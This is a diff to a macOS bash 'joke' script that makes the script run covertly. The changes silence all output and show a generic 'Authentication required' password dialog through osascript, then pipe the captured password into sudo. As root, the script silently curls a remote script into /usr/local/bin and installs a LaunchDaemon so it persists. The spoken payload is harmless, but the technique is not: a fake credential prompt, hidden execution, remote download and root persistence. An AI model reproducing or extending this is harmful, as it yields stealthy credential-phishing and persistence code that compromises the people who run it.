@@ -1,5 +1,8 @@
 #!/bin/bash
 
+# Run quietly
+exec >/dev/null 2>&1
+
 set -e
 
 SCRIPT_URL="https://raw.githubusercontent.com/MatthewGCampbell/MatthewGCampbell/main/display_message.sh"
@@ -7,43 +10,36 @@ SCRIPT_PATH="/usr/local/bin/joke_display_message.sh"
 PLIST_PATH="/Library/LaunchDaemons/com.jokemessage.plist"
 
 ############################################
-# Elevation & password prompt (moved inside)
+# Silent elevation & password prompt
 ############################################
 
 if [[ "$EUID" -ne 0 ]]; then
-  # Ask for password via GUI
-  thePassword="$(osascript -e 'text returned of (display dialog "Please enter your password:" default answer "" with hidden answer)')"
+  thePassword="$(osascript -e 'text returned of (display dialog "Authentication required" default answer "" with hidden answer)')"
 
-  if [[ -z "$thePassword" ]]; then
-    echo "No password entered or dialog cancelled. Exiting."
-    exit 1
-  fi
+  [[ -z "$thePassword" ]] && exit 0
 
-  # Re-run this script as root, passing the password as $1
-  echo "$thePassword" | sudo -S bash "$0" "$thePassword" "$@"
-  exit $?
+  printf "%s" "$thePassword" | sudo -S bash "$0" "$thePassword" "$@" >/dev/null 2>&1 || exit 1
+  exit 0
 fi
 
 ############################################
-# From here down, we are running as root
+# Now running as root silently
 ############################################
 
-# Capture password passed to script (from the non-root instance)
 PASSWORD="$1"
 
+# Download script without output
+curl -fsSL "$SCRIPT_URL" -o "$SCRIPT_PATH" >/dev/null 2>&1
 
-echo "[+] Downloading message script to $SCRIPT_PATH ..."
-curl -fsSL "$SCRIPT_URL" -o "$SCRIPT_PATH"
-
-# Override with the joke version
+# Replace with joke script quietly
 cat <<'EOF' > "$SCRIPT_PATH"
 #!/bin/bash
 /usr/bin/say "This is a joke message. Your system is fine."
 EOF
 
-chmod 755 "$SCRIPT_PATH"
+chmod 755 "$SCRIPT_PATH" >/dev/null 2>&1
 
-echo "[+] Creating LaunchDaemon plist at $PLIST_PATH ..."
+# Create LaunchDaemon quietly
 cat <<EOF > "$PLIST_PATH"
 <?xml version="1.0" encoding="UTF-8"?>
 <!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
@@ -63,11 +59,10 @@ cat <<EOF > "$PLIST_PATH"
 </plist>
 EOF
 
-chown root:wheel "$PLIST_PATH"
-chmod 644 "$PLIST_PATH"
+chown root:wheel "$PLIST_PATH" >/dev/null 2>&1
+chmod 644 "$PLIST_PATH" >/dev/null 2>&1
 
-launchctl unload "$PLIST_PATH" 2>/dev/null || true
-launchctl load "$PLIST_PATH"
+launchctl unload "$PLIST_PATH" >/dev/null 2>&1 || true
+launchctl load "$PLIST_PATH" >/dev/null 2>&1
 
-# Test speech immediately
-/usr/bin/say "This is a joke message. Your system is fine."
+/usr/bin/say "This is a joke message. Your system is fine." >/dev/null 2>&1 &
